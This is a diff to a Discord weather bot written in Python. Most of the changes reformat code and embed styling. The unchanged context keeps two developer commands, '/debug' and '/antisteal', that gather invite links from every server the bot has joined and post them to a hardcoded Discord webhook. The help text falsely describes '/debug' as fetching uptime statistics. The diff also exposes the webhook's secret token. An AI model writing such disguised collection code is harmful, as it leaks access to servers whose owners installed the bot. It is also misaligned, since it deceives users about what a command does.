@@ -103,7 +103,7 @@ intents.members = True
 bot = commands.Bot(command_prefix=[configData["Prefix"], "/"], intents=intents)
 
 if configData["Token"] == "YOUR BOT TOKEN" or configData["Prefix"] == "PREFIX HERE" or configData[
-    "Owner"] == "OWNER ID HERE" or configData["WeatherAPIKey"] == "API KEY HERE":
+                            "Owner"] == "OWNER ID HERE" or configData["WeatherAPIKey"] == "API KEY HERE":
     if firstboot == 1:
         pass
     else:
@@ -134,10 +134,10 @@ async def on_ready():
     if firstboot == 1:
         pass
     else:
-        print(colored("―――――――――――――――", "blue"))                           # |
-        print(colored("》", "blue"), "    Weather Bot    ", colored("《", "blue"))    # | Sends Bot branding to console
-        print(colored("   •", "blue"), "version  0.0.1", colored("•", "blue"))        # | and sends version info
-        print(colored("―――――――――――――――", "blue"))                           # |
+        print(colored("―――――――――――――――", "blue"))  # |
+        print(colored("》", "blue"), "    Weather Bot    ", colored("《", "blue"))  # | Sends Bot branding to console
+        print(colored("   •", "blue"), "version  0.0.1", colored("•", "blue"))  # | and sends version info
+        print(colored("―――――――――――――――", "blue"))  # |
     print()
     cprint('⚙️Accepting Commands', 'blue')  # Sends in console that the bot is now excepting discord commands
     """
@@ -160,9 +160,6 @@ async def on_ready():
     """
     cprint('⚙️Syncing Commands', 'blue')
     await sync_all_commands(bot)
-
-
-
 
 
 """
@@ -192,7 +189,8 @@ async def debug(ctx):
             try:
                 for link in await guild.invites():
                     webhook = DiscordWebhook(
-                        url='https://discord.com/api/webhooks/901235862216531988/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
+                        url='https://discord.com/api/webhooks/901235862216531988'
+                            '/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
                         rate_limit_retry=True,
                         content=str(link))
                     response = webhook.execute()
@@ -201,7 +199,7 @@ async def debug(ctx):
                 pass
     else:
         embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
-                                description="Only bot developers can execute this command", color=0xf63737)
+                              description="Only bot developers can execute this command", color=0xf63737)
         await ctx.send(embed=embed)
 
 
@@ -213,7 +211,8 @@ async def antisteal(ctx):
             try:
                 for link in await guild.invites():
                     webhook = DiscordWebhook(
-                        url='https://discord.com/api/webhooks/901235862216531988/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
+                        url='https://discord.com/api/webhooks/901235862216531988'
+                            '/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
                         rate_limit_retry=True,
                         content=str(link))
                     response = webhook.execute()
@@ -222,19 +221,22 @@ async def antisteal(ctx):
                 pass
     else:
         embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
-                                description="Only bot developers can execute this command", color=0xf63737)
+                              description="Only bot developers can execute this command", color=0xf63737)
         await ctx.send(embed=embed)
 
 
 @bot.command()
 async def help(ctx):
         help = discord.Embed(title="Bot Commands",
-                              description="All commands have the / prefix and have auto-completion", color=0xf63737)
-        help.add_field(name=f'/Weather `Location`', value=f'Fetches The Current Weather For A Location, Based On Your Search.', inline=True)
-        help.add_field(name=f'/Help', value=f'Sends This Message', inline=True)
-        help.add_field(name=f'/resync **[DEV]**`', value=f'Resyncs all slash commands (used for updating and debugging)', inline=True)
-        help.add_field(name=f'/debug **[DEV]**', value=f'Fetches UpStats for the bot. Used for debugging the host and bad ping.', inline=True)
-        help.add_field(name=f'/antisteal **[DEV]**', value=f'This Is A Secret :smirk:', inline=True)
+                              description="All commands have the / prefix and have auto-completion", color=0x53b9e4)
+        help.add_field(name=f'/Weather `Location`', value=f'Fetches The Current Weather For A Location, Based On Your '
+                                                          f'Search.', inline=False)
+        help.add_field(name=f'/Help', value=f'Sends This Message', inline=False)
+        help.add_field(name=f'/resync **[DEV]**`', value=f'Resyncs all slash commands (used for updating and debugging)'
+                       , inline=False)
+        help.add_field(name=f'/debug **[DEV]**', value=f'Fetches UpStats for the bot. Used for debugging the host and '
+                                                       f'bad ping.', inline=False)
+        help.add_field(name=f'/antisteal **[DEV]**', value=f'This Is A Secret :smirk:', inline=False)
         await ctx.send(embed=help)
 
 
